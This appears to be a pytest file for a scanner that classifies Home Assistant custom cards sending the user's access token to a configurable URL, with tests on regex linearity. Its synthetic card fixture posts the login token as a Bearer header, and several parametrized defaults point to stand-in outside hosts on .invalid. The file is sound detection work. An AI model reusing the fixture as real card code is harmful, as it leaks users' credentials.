"""(0.15, his yes 2026-11-22) A login token sent to `hass.hassUrl(<the card's own setting>)`
is a note when the card's default for that setting is a "/" path or absent; an outside
default, or one Barkley can't read, keeps the Threat.

Synthetic cards shaped like the real one from the full Marketplace run (an enrol card that
posts photos with the token to its own integration's page); hosts are .invalid. Nothing
runs: Semgrep parses, the rest is a text read.
"""

from __future__ import annotations

import shutil
import textwrap
import time
from pathlib import Path

import pytest

from sniff_test.analyzers import js_settings, semgrep
from sniff_test.models import Severity, Target, TargetKind

needs_semgrep = pytest.mark.skipif(shutil.which("semgrep") is None, reason="needs semgrep")

CARD = """\
    const DEFAULT_ENDPOINT = {default};
    class EnrolCard extends HTMLElement {{
      setConfig(config) {{
        this._config = {{ title: "Enrol", {prop}...config }};
      }}
      set hass(hass) {{ this._hass = hass; }}
      async _upload(form) {{
        const token = this._hass.auth.data.access_token;
        const url = this._hass.hassUrl({path});
        await fetch(url, {{ method: "POST", headers: {{ Authorization: `Bearer ${{token}}` }},
                           body: form }});
      }}
    }}
    customElements.define("enrol-card", EnrolCard);
    """


def _card(default: str = '"/api/acme/enroll"', prop: str = "endpoint: DEFAULT_ENDPOINT, ",
          path: str = "this._config.endpoint") -> str:  # fmt: skip
    return CARD.format(default=default, prop=prop, path=path)


def _scan(tmp_path: Path, text: str):
    root = tmp_path / "card"
    root.mkdir(parents=True)
    (root / "hacs.json").write_text('{"name": "Enrol card", "filename": "enrol-card.js"}')
    (root / "enrol-card.js").write_text(textwrap.dedent(text))
    target = Target(source=str(root), kind=TargetKind.PLUGIN, root=root)
    work = tmp_path / "work"
    work.mkdir()
    return [f for f in semgrep.run(target, work).findings
            if f.rule_id in ("card-token-exfil", js_settings.RULE)]  # fmt: skip


@needs_semgrep
def test_the_real_shape_a_slash_default_is_a_note(tmp_path):
    got = _scan(tmp_path, _card())
    assert [(f.rule_id, f.severity) for f in got] == [(js_settings.RULE, Severity.INFO)]
    assert "By default that is /api/acme/enroll" in got[0].message
    assert "endpoint" in got[0].message


@needs_semgrep
def test_no_default_is_a_note_that_says_so(tmp_path):
    got = _scan(tmp_path, _card(prop=""))
    assert [f.rule_id for f in got] == [js_settings.RULE]
    assert "sets no default" in got[0].message


@needs_semgrep
@pytest.mark.parametrize(
    "default",
    [
        '"https://collect.invalid/enroll"',  # the developer chose another site
        '"//collect.invalid/enroll"',  # "//" is another site too
        "pickEndpoint()",  # can't be read: Barkley can't tell
    ],
)
def test_an_outside_or_unreadable_default_stays_a_threat(tmp_path, default):
    got = _scan(tmp_path, _card(default=default))
    assert [f.rule_id for f in got] == ["card-token-exfil"]


@needs_semgrep
def test_a_second_outside_default_for_the_setting_keeps_the_threat(tmp_path):
    # getStubConfig hands a different default to new cards
    text = _card().replace(
        "set hass(hass)", 'static getStubConfig() { return { endpoint: "https://c.invalid/x" }; }\n'
        "      set hass(hass)")  # fmt: skip
    assert [f.rule_id for f in _scan(tmp_path, text)] == ["card-token-exfil"]


@needs_semgrep
def test_more_than_the_setting_in_the_path_stays_a_threat(tmp_path):
    # hassUrl(setting + more): not just the setting, so not this lens
    got = _scan(tmp_path, _card(path="this._config.endpoint + '/x'"))
    assert [f.rule_id for f in got] == ["card-token-exfil"]


def test_defaults_reads_each_form():
    text = (
        'const D = "/api/x"; a = { endpoint: D }; b = config.endpoint || "/api/y";\n'
        'const { endpoint = "/api/z" } = config;'
    )
    assert js_settings.defaults(text, "endpoint") == ['"/api/x"', '"/api/y"', '"/api/z"']
    assert js_settings.defaults("x = { endpoint: make() }", "endpoint") == [None]
    assert js_settings.defaults("nothing here", "endpoint") == []


def test_setting_of_follows_one_name_only():
    text = "const url = this._hass.hassUrl(this._config.endpoint);\nfetch(url);"
    assert js_settings.setting_of(text, "url", text.index("fetch")) == "endpoint"
    assert js_settings.setting_of(text, "this._hass.hassUrl(this.config.url)", 0) == "url"
    assert js_settings.setting_of(text, "this._hass.hassUrl(other.endpoint)", 0) is None


# --- hostile input stays linear -----------------------------------------------------------

_N = 40_000


@pytest.mark.parametrize(
    "text",
    [
        "endpoint:" * _N,
        "config.endpoint ||" * _N,
        "{endpoint=" * _N,
        '"' + "endpoint: " * _N,
        "const D =" + " " * _N,
        "(" * _N + "endpoint:",
    ],
)
def test_patterns_stay_linear(text):
    start = time.perf_counter()
    js_settings.defaults(text, "endpoint")
    js_settings.setting_of(text, "this._hass.hassUrl(" + "(" * 2000 + ")", 0)
    assert time.perf_counter() - start < 2
